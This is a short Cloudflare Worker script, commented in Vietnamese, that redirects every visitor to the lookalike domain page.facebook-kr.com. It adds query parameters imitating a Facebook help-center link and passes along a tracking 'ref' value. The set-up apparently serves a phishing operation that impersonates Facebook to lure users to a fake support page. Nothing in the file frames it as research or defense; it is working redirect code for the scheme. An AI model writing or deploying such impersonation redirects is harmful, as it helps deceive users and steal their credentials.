addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Thay thế 'https://example.com' bằng URL của trang web bạn muốn chuyển hướng đến
  const redirectTo = 'https://page.facebook-kr.com/';

  // Lấy tham số query từ URL hiện tại (?ref=)
  const currentURL = new URL(request.url);
  const queryRef = currentURL.searchParams.get('ref');

  // Tạo URL mới với tham số query (?www.facebook.com/help/1380418588640631)
  const redirectURL = new URL(redirectTo);
  if (queryRef) {
    redirectURL.searchParams.set('next', 'www.facebook.com');
    redirectURL.searchParams.set('help', '1380418588640631');
    redirectURL.searchParams.set('id', queryRef);
  }

  // Thực hiện chuyển hướng với URL mới
  return Response.redirect(redirectURL, 301);
}
